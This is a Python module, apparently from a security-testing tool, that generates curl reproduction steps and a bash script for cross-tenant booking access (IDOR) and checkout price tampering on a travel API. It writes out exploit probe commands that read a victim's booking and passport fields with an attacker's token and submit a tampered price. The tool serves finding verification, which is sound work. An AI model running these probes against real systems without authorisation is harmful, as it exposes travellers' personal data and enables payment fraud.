"""Reproduction Recipe Generator for Drishti AI findings.

Generates safe, sequential reproduction steps and shell commands.
STRICT REQUIREMENT: Never leaks real secrets, JWTs, or passwords.
All credentials and hosts are strictly parameterized as $DRISHTI_* environment variables.
"""

from typing import Any, Dict, List, Optional
import urllib.parse

from drishti.core.models import InvariantType, ReproductionRecipe


class ReproductionRecipeGenerator:
    """Generates parameterized, safe reproduction recipes for travel security findings."""

    @staticmethod
    def generate_i01_recipes(
        victim_booking_id: str,
        attacker_booking_id: Optional[str] = None,
        target_path: str = "/api/v2/bookings/{booking_id}",
    ) -> List[ReproductionRecipe]:
        """Generates reproduction steps for I-01 Tenant Isolation (BOLA/IDOR) violations.

        Honors target_path and safely URL-encodes dynamic booking ID path segments.
        """
        raw_res_id = victim_booking_id or "$DRISHTI_VICTIM_BOOKING_ID"
        raw_att_id = attacker_booking_id or "$DRISHTI_ATTACKER_BOOKING_ID"

        # Safely encode path segments while preserving bash variable placeholders
        safe_victim_id = (
            raw_res_id
            if raw_res_id.startswith("$")
            else urllib.parse.quote(str(raw_res_id), safe=":$")
        )
        safe_attacker_id = (
            raw_att_id
            if raw_att_id.startswith("$")
            else urllib.parse.quote(str(raw_att_id), safe=":$")
        )

        template = target_path or "/api/v2/bookings/{booking_id}"
        victim_url_path = template.replace("{booking_id}", safe_victim_id)
        attacker_url_path = template.replace("{booking_id}", safe_attacker_id)

        return [
            ReproductionRecipe(
                step_number=1,
                description="Victim Negative Control: Verify victim agency can read own booking and inspect private canary.",
                curl_command=(
                    f'curl -s -X GET "$DRISHTI_TARGET_URL{victim_url_path}" \\\n'
                    f'  -H "Authorization: Bearer $DRISHTI_VICTIM_TOKEN" \\\n'
                    f'  -H "Accept: application/json"'
                ),
                expected_status=200,
            ),
            ReproductionRecipe(
                step_number=2,
                description="Attacker Negative Control: Verify attacker agency can legitimately access their own booking.",
                curl_command=(
                    f'curl -s -X GET "$DRISHTI_TARGET_URL{attacker_url_path}" \\\n'
                    f'  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    f'  -H "Accept: application/json"'
                ),
                expected_status=200,
            ),
            ReproductionRecipe(
                step_number=3,
                description="Exploit Probe: Attacker issues cross-tenant read targeting victim booking.",
                curl_command=(
                    f'curl -s -X GET "$DRISHTI_TARGET_URL{victim_url_path}" \\\n'
                    f'  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    f'  -H "Accept: application/json"'
                ),
                expected_status=403,  # In secure system; returns 200 in vulnerable system
            ),
            ReproductionRecipe(
                step_number=4,
                description="Independent API Read-Back: Verify presence of victim canary and PII in attacker response.",
                curl_command=(
                    f'curl -s -X GET "$DRISHTI_TARGET_URL{victim_url_path}" \\\n'
                    f'  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    f'  | grep -E "canary_token|passenger_passport"'
                ),
                expected_status=200,
            ),
        ]

    @staticmethod
    def generate_i02_recipes(
        booking_id: Optional[str] = None,
        tampered_amount: Optional[int] = None,
        tampered_currency: Optional[str] = None,
        authoritative_amount: Optional[int] = None,
        authoritative_currency: Optional[str] = None,
    ) -> List[ReproductionRecipe]:
        """Generates reproduction steps for I-02 Server-Authoritative Pricing violations.

        Uses safe bash double-quote escaping to allow $DRISHTI_HOLD_TOKEN expansion in bash.
        """
        raw_book_id = booking_id or "$DRISHTI_CREATED_BOOKING_ID"
        safe_book_id = (
            raw_book_id
            if raw_book_id.startswith("$")
            else urllib.parse.quote(str(raw_book_id), safe=":$")
        )

        t_amt = tampered_amount if tampered_amount is not None else 100
        t_curr = tampered_currency or "INR"
        auth_amt = authoritative_amount if authoritative_amount is not None else 1800000
        auth_curr = authoritative_currency or "INR"

        # Bash expansion safe: break out of single quotes so $DRISHTI_HOLD_TOKEN expands
        booking_payload = (
            '\'{"hold_token": "\'"$DRISHTI_HOLD_TOKEN"\'", '
            f'"client_amount_minor_units": {t_amt}, '
            f'"client_currency": "{t_curr}"}}\''
        )

        return [
            ReproductionRecipe(
                step_number=1,
                description=f"Inspect Baseline Quote: Query authoritative quote ({auth_amt} {auth_curr}).",
                curl_command=(
                    'curl -s -X POST "$DRISHTI_TARGET_URL/api/v2/search" \\\n'
                    '  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    '  -H "Content-Type: application/json" \\\n'
                    '  -d \'{"destination": "Goa"}\''
                ),
                expected_status=200,
            ),
            ReproductionRecipe(
                step_number=2,
                description="Acquire Perishable Hold: Request temporary inventory reservation token.",
                curl_command=(
                    'curl -s -X POST "$DRISHTI_TARGET_URL/api/v2/holds" \\\n'
                    '  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    '  -H "Content-Type: application/json" \\\n'
                    '  -d \'{"quote_id": "QT_GOA_501"}\''
                ),
                expected_status=200,
            ),
            ReproductionRecipe(
                step_number=3,
                description=f"Exploit Probe: Attempt checkout tampering price to {t_amt} {t_curr}.",
                curl_command=(
                    'curl -s -X POST "$DRISHTI_TARGET_URL/api/v2/bookings" \\\n'
                    '  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    '  -H "Content-Type: application/json" \\\n'
                    f'  -d {booking_payload}'
                ),
                expected_status=400,  # In secure system; returns 200 in vulnerable system
            ),
            ReproductionRecipe(
                step_number=4,
                description="Independent API Read-Back: Verify database persisted tampered price.",
                curl_command=(
                    f'curl -s -X GET "$DRISHTI_TARGET_URL/api/v2/bookings/{safe_book_id}" \\\n'
                    f'  -H "Authorization: Bearer $DRISHTI_ATTACKER_TOKEN" \\\n'
                    f'  | grep -E "amount_minor_units|currency"'
                ),
                expected_status=200,
            ),
        ]

    @classmethod
    def generate_reproduction_script(
        cls,
        recipes: List[ReproductionRecipe],
        target_url: str = "http://localhost:8000",
    ) -> str:
        """Generates a complete, executable bash script for human reproduction and audit."""
        script_lines = [
            "#!/usr/bin/env bash",
            "# Drishti AI - Automated Finding Reproduction Script",
            "# Generated with strict zero-secret exposure ($DRISHTI_* environment variables).",
            "set -euo pipefail",
            "",
            ': "${DRISHTI_TARGET_URL:="' + target_url + '"}"',
            ': "${DRISHTI_ATTACKER_TOKEN:="mock_jwt_agency_b_admin_token"}"',
            ': "${DRISHTI_VICTIM_TOKEN:="mock_jwt_agency_a_admin_token"}"',
            ': "${DRISHTI_HOLD_TOKEN:="HLD_AUTO_TOKEN"}"',
            "",
            'echo "[+] Beginning finding reproduction on ${DRISHTI_TARGET_URL}..."',
            "",
        ]

        for recipe in recipes:
            script_lines.append(f"# Step {recipe.step_number}: {recipe.description}")
            script_lines.append(recipe.curl_command)
            script_lines.append(f'echo "[✓] Step {recipe.step_number} completed (expected HTTP {recipe.expected_status})"')
            script_lines.append("")

        script_lines.append('echo "[+] Reproduction run finished successfully."')
        return "\n".join(script_lines)
